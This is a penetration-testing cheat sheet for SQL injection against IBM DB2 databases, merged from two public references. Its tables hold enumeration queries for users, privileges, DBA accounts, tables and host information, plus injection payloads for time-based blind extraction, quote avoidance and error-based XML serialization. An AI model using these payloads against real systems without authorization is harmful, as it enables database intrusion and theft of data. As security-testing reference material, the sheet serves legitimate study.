# SQLi - DB2 (IBM)

## Pentest Monkey DB2 SQL Injection Cheat Sheet

- http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet

| Enumerate    | Command                 |
|--------------|-------------------------|
|Version|	`select versionnumber, version_timestamp from sysibm.sysversions;`|
|Comments|	`select blah from foo; -- comment like this`|
|Current User|	`select user from sysibm.sysdummy1;`<br> `select session_user from sysibm.sysdummy1;` <br>`select system_user from sysibm.sysdummy1;`|
|List Users|	N/A (I think DB2 uses OS-level user accounts for authentication.)<br>	Database authorities (like roles, I think) can be listed like this:	`select grantee from syscat.dbauth;`|
|List Password Hashes|	N/A (I think DB2 uses OS-level user accounts for authentication.)|
|List Privileges|	`select * from syscat.tabauth;` — privs on tables<br>	`select * from syscat.dbauth where grantee = current user;`<br>	`select * from syscat.tabauth where grantee = current user;`<br>	`select * from SYSIBM.SYSUSERAUTH` – List db2 system privilegies|
|List DBA Accounts|	`select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’` or `SYSADMAUTH = ‘G’`|
|Current Database|	`select current server from sysibm.sysdummy1;`|
|List Databases	|`SELECT schemaname FROM syscat.schemata;`|
|List Columns|	`select name, tbname, coltype from sysibm.syscolumns;`|
|List Tables|	`select name from sysibm.systables;`|
|Find Tables From Column Name|	`select tbname from sysibm.syscolumns where name=’username’`|
|Select Nth Row|	`select name from (SELECT name FROM sysibm.systables order by name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only;`|
|Select Nth Char|	`SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1;`  — returns b|
|Bitwise AND|	This page seems to indicate that DB2 has no support for bitwise operators! (404)|
|ASCII Value -> Char|	`select chr(65) from sysibm.sysdummy1;` — returns ‘A’|
|Char -> ASCII Value|	`select ascii(‘A’) from sysibm.sysdummy1;` — returns 65|
|Casting|	`SELECT cast(’123′ as integer) FROM sysibm.sysdummy1;`<br>`SELECT cast(1 as char) FROM sysibm.sysdummy1;`|
|String Concatenation|	`SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1;` — returns ‘abc’<br>	`select ‘a’ || ‘b’ from sysibm.sysdummy1;` — returns ‘ab’|

## Security Et Alii

- https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/

`*` indicates different from PentestMonkey (identical items have been removed from the table below)

| Enumerate    | Command                 |
|--------------|-------------------------|
|Version`*` | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo`<br>`select getvariable(‘sysibm.version’) from sysibm.sysdummy1` — (v8+)<br>`select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo`<br>`select service_level,bld_level from sysibmadm.env_inst_info`|
|List Users`*` | DB2 uses OS accounts. Those with DB2 access can be retrieved with:<br>`select distinct(authid) from sysibmadm.privileges` — priv required<br>`select grantee from syscat.dbauth` — incomplete results<br>`select distinct(definer) from syscat.schemata` — more accurate<br>`select distinct(grantee) from sysibm.systabauth` — same as previous|
|List DBA Accounts`*`|`select distinct(grantee) from sysibm.systabauth where CONTROLAUTH=’Y’`|
|List Databases`*`|`select distinct(table_catalog) from sysibm.tables`|
|List Columns`*` | `select name, tbname, coltype from sysibm.syscolumns` — also valid syscat and sysstat|
|Select Nth Row`*`|`select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only`|
|Bitwise AND/OR/NOT/XOR`*`|`select bitand(1,0) from sysibm.sysdummy1` — returns 0. Also available bitandnot, bitor, bitxor, bitnot|
|IF Statement`*`| Seems only allowed in stored procedures. Use case logic instead.|
|Case statement`*` | `select CASE WHEN (1=1) THEN ‘AAAAAAAAAA’ ELSE ‘BBBBBBBBBB’ END from sysibm.sysdummy1` |
|Avoiding Quotes`*` | `SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1` — returns “ADRI”. Works without select too |
|Time Delay* | `' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68` — If user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. However, if user doesn’t start with ascii 68, the heavy query won’t execute and thus the response will be faster. |
|Serialize to XML (for error based)* | `select xmlagg(xmlrow(table_schema)) from sysibm.tables` — returns all in one xml-formatted string<br>`select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)` — Same but without repeated elements<br> `select xml2clob(xmelement(name t, table_schema)) from sysibm.tables` — returns all in one xml-formatted string (v8). May need `CAST(xml2clob(… AS varchar(500))` to display the result.|
|Command Execution`*`|Only allowed through procedures or UDFs|
|Local File Access`*`|I think this is only available through stored procedures or db2 tool.|
|Hostname/IP and OS Info`*`|`select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` — requires priv|
|Location of DB Files`*`|`select * from sysibmadm.reg_variables where reg_var_name=’DB2PATH’` — requires priv|
|System Config`*`|`select dbpartitionnum, name, value from sysibmadm.dbcfg where name like ‘auto_%’` — Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.<br> `select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg` — Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.|
|Default System Databases`*`|What makes sense for DB2 is to know default System Schemas (and maybe tables): `SYSIBM/SYSCAT/SYSSTAT/SYSPUBLIC/SYSIBMADM/SYSTOOLS`|